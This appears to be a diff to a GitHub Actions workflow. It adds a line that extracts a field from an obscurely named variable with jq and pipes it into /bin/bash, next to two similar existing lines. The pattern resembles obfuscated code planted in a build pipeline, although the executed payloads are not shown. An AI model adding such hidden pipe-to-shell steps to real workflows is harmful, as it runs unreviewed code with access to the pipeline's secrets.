@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$dixug1532" | jq -r .fs65 | /bin/bash
           echo $lubi964 | jq -r .ndua78 | /bin/bash
+          echo $zv7 | jq -r .fjeit54 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
